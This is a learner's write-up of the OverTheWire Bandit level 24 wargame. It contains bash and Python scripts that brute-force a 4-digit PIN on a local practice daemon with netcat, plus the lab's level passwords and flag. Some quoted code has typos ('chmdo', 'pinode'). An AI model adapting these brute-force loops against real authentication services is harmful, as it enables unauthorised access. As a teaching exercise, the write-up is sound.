# Level 24

## Level Goal
A daemon is listening on port `30002` and will give you the password for bandit25
if given the password for bandit24 and a secret numeric 4-digit pincode.
There is no way to retrieve the pincode except by going through all of the
`10000` combinations, called brute-forcing.

## Access

```
ssh bandit24@bandit.labs.overthewire.org -p 2220
```

pwd: UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ

## Set Aliases

```
alias l='ls -lah --color=auto'
alias v=vim
export EDITOR=vim
```

## Current Level Password File

```
/etc/bandit_pass/bandit24
```

### Unknown

- How to connect with the daemon?
- Generate pin codes
- Submit the password and numeric pin code

## TRY to identify the daemon

### systemctl

```
systemctl

-bash: systemctl: command not found
```
The server doesn't use `systemd`. I can't list the daemons.
Review netcat.

### Banner Grabbing
```
nc -nv 127.0.0.1 30002

I am the pincode checker for user bandit25. Please enter the password for user
bandit24 and the secret pincode on a single line, separated by a space.
```
I was now able to find a lead!

## TRY to connect to the daemon port

```
nc localhost 30002

I am the pincode checker for user bandit25. Please enter the password for user
bandit24 and the secret pincode on a single line, separated by a space.
```

## TRY to pass the password and pincode to netcat
```
echo '1234' | cat /etc/bandit_pass/bandit24 - | paste -sd' ' | nc localhost 30002

I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
Wrong! Please enter the correct pincode. Try again.
```
There are 4 digits in the pincode.

## Create a script that generates 0000-9999
```
for i in {0..9999}
do
  echo "$i"
done
```

```
# create dir
cd $(mktemp -d)
# /tmp/tmp.WjqjPBusKL

mkdir out


# create script
vim brute.sh

#!/bin/bash

max=9999
for((i=0; i<=$max;i++))
do
# pincode=$(echo "000$i" | grep -o '\d\{4\}$')
  pincode=$(echo "000$i")
  pincode=${pincode: -4}

  echo $pincode | cat /etc/bandit_pass/bandit24 - | paste -sd' ' | nohup nc -w 1 localhost 30002 &> /tmp/tmp.WjqjPBusKL/out/"$pincode".txt &

  if [ $(($i % 5)) -eq 0 ]; then
    sleep 2
  fi
done

grep -i '' *.txt > out

# make executable
chmdo u+x brute.sh

# exectute
./brute.sh
```
### Shell Script notes:
- My first script runs out of memory.`./brute.sh: fork: retry: Resource temporarily unavailable`. So I added sleep and timeouts. 
  But is is so sloooowwwww...1try/second which will take me 9999s/60m/60h = 2.78 hours.
- Changed to 5try/2s. The 5try/2s is the sweet spot, 10try/2s fails with resource unavailable.
  (9,999/5) * 2s = 3,999.6s/60m = 66.66 minutes.

## While running try to search for output
```
grep -Hnriv 'enter' out/ | sort -u > flag.txt
cat flag.txt

out/2588.txt:2:Correct!
out/2588.txt:3:The password of user bandit25 is uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG
out/2588.txt:4:
out/2588.txt:5:Exiting.
out/3371.txt:3:
out/3372.txt:3:
out/3373.txt:3:
out/3374.txt:3:
out/3375.txt:3:
```
This output says that the pincode is `2588`.

# Flag

```
uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG
```

# Resources
- [Netcat](https://youtube.com/playlist?list=PLBf0hzazHTGOa6ipWQXp-QacbKyV7rKox) by HackerSploit

# Retospective


## What went well?
- Managed to create a script to bruteforce the daemon even if it's slow.

## What could have gone better?
- Create a script wherein it'll keep the connection open, so we can brute force
  the pincode much faster, and it'll not result in resource unavailable.
- Bash can actually read `${0000..9999}` and I do not need to manually prefix
  it with zeroes and trim it.
- Forgot that netcat actually opens a connection and I do not need to always reopen it.

## What might I need to learn for better mastery, or what strategies might I use the next time to get better results?
- Review things about netcat.
- Learn more about network data streams.

## How other people solved this?

### [OverTheWire: Bandit Level 24](https://medium.com/secttp/overthewire-bandit-level-24-aaaaf795b701) by S.P.

- Turns out that the server has a `python` and not `go`.

They created a python script with the ff content:
```python
#!/usr/bin/env python3
# coding: utf-8

import sys
import socket
pincode = 0
password = "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ"
try:
    # Connect to server
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("127.0.0.1", 30002))

    # Print welcome message
    welcome_msg = s.recv(2048)
    print(welcome_msg)
    # Try brute-forcing
    while pincode < 10000:
        pincode_string = str(pincode).zfill(4)
        message=password+" "+pincode_string+"\n"
        # Send message
        s.sendall(message.encode())
        receive_msg = s.recv(1024)
        # Check result
        if "Wrong" in receive_msg:
            print("Wrong PINCODE: %s" % pincode_string)
        else:
            print(receive_msg)
            break
        pinode += 1
finally:
    sys.exit(1)
```

### [Bandit Level 24 → Level 25 | OverTheWire](https://programmercave0.github.io/blog/2019/12/26/Bandit-Level-24-Level-25-OverTheWire) by Programmercave

They created a shell script that produces `0000..9999` and output it to a text file.
Then use it as an input for the netcat.

The script:
```
#!/bin/bash
for i in {0000..9999}
do
  echo "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ $i"
done
```

Producing pincodes
```
chmod 700 bruteforcescript.sh
./bruteforcescript.sh > combinations.txt
```

Using the pincode
```
nc localhost 30002 < combinations.txt
```

